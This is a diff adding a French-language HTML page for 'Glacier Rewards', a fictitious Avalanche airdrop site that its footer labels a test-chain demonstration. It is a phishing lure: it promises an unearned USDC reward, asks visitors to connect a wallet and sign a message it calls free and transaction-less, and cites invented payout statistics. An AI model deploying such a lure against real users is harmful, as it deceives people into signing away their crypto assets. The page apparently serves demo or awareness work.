@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Glacier Rewards — Récompenses communautaires Avalanche</title>
+<link rel="stylesheet" href="./style.css">
+</head>
+<body class="lure-site">
+
+<div class="site-top">
+  <div class="site-top-inner">
+    <a class="wordmark" href="./index.html">
+      <svg viewBox="0 0 28 28" fill="none" aria-hidden="true"><path d="M14 3 L25 23 H3 Z" fill="#0b6b86"/><path d="M14 3 L19.5 13 L11 23 H3 Z" fill="#0c1a26" opacity="0.18"/></svg>
+      Glacier Rewards
+    </a>
+    <span class="chain-pill" id="chain-pill"><i></i><span id="chain-pill-text">Vérification du réseau…</span></span>
+  </div>
+</div>
+
+<main class="page">
+  <section class="hero">
+    <h1>Votre activité Avalanche vous donne droit à une récompense.</h1>
+    <p class="lede">Le programme Glacier Rewards redistribue une partie des frais de réseau du dernier trimestre aux portefeuilles actifs sur Avalanche. La vérification se fait en moins d'une minute, sans information personnelle.</p>
+    <p class="deadline">Campagne clôturée le <b id="countdown-clock">—</b></p>
+    <svg class="peaks" viewBox="0 0 520 160" preserveAspectRatio="none" aria-hidden="true">
+      <polygon points="0,160 0,92 70,38 130,80 200,22 270,76 330,30 390,84 460,46 520,70 520,160" fill="#0b6b86" opacity="0.12"/>
+      <polygon points="0,160 0,120 90,70 170,110 250,58 320,104 400,62 470,96 520,100 520,160" fill="#0b6b86" opacity="0.2"/>
+    </svg>
+  </section>
+
+  <section class="claim panel" id="claim-card">
+    <h2>Vérifier mon éligibilité</h2>
+    <p class="sub">Connectez le portefeuille que vous utilisez habituellement sur Avalanche.</p>
+
+    <div id="wallet-missing" hidden>
+      <p class="status bad"><i></i><span class="text">Aucun portefeuille détecté dans ce navigateur. Installez MetaMask ou Core, puis rechargez cette page.</span></p>
+    </div>
+
+    <div id="step-connect">
+      <button class="btn btn-primary" id="btn-connect" type="button" disabled>Recherche d'un portefeuille…</button>
+      <p class="status" id="connect-state"><i></i><span class="text">En attente.</span><small hidden></small></p>
+    </div>
+
+    <div id="step-eligible" hidden>
+      <p class="eligible-title">Portefeuille vérifié</p>
+      <div class="reward">312,50<span>USDC</span></div>
+      <p class="acct" id="verified-acct"></p>
+      <button class="btn btn-primary" id="btn-claim" type="button">Réclamer ma récompense</button>
+      <p class="status" id="claim-state"><i></i><span class="text">Signez pour confirmer votre portefeuille (gratuit, sans transaction).</span><small hidden></small></p>
+    </div>
+  </section>
+
+  <section class="info">
+    <h2>Comment ça marche</h2>
+    <ol class="steps">
+      <li><strong>Connectez votre portefeuille.</strong> Aucune information personnelle n'est demandée.</li>
+      <li><strong>Confirmez votre éligibilité par signature.</strong> Cette étape ne coûte rien et n'envoie aucune transaction.</li>
+      <li><strong>Recevez votre récompense.</strong> Les versements sont traités par lots, sous 24 à 48 h.</li>
+    </ol>
+    <p class="facts">Portefeuilles pris en charge : MetaMask, Core, Rabby, Trust Wallet — tout portefeuille compatible EIP-6963 ou injectant <code>window.ethereum</code>.</p>
+    <p class="facts">Ce trimestre, le programme a déjà vérifié 41 382 portefeuilles pour 6,1 M AVAX distribués.</p>
+  </section>
+</main>
+
+<footer class="disclaimer">Démonstration : site fictif, chaîne de test, contrats de test.</footer>
+
+<script src="./chain-utils.js"></script>
+<script src="./app.js"></script>
+</body>
+</html>
